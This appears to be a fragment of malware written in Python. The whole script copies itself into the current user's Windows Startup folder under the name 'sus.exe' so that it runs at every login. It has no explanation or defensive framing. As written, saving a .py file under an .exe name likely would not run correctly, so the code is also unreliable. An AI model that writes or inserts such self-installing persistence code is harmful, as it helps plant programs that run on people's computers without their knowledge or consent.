import os
import shutil
from pathlib import Path

curr_file_path = os.path.abspath(__file__)
startup_folder = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
startup_file_path = os.path.join(startup_folder, "sus.exe")

if not os.path.exists(startup_file_path):
    shutil.copy2(curr_file_path, startup_file_path)
